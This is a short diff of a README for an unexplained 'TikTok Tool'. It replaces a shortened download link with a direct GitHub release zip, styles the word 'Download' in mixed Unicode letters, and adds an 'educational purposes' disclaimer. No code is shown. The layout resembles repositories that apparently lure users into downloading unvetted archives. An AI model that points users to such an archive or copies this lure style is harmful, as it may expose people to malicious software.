@@ -1,6 +1,6 @@
 # TikTok Tool 🟢
 
-# 📁[𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://shorturl.at/jmL12)
+# 📁[𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/LucsTD/TikTok-Tool/releases/download/download/TikTokTool.zip)
 
 ## ⚠️  DISCLAIMER
 ## This project was made for educational purposes and personal use. You hold responsibility, liability and accountability for any consequences caused by your actions.
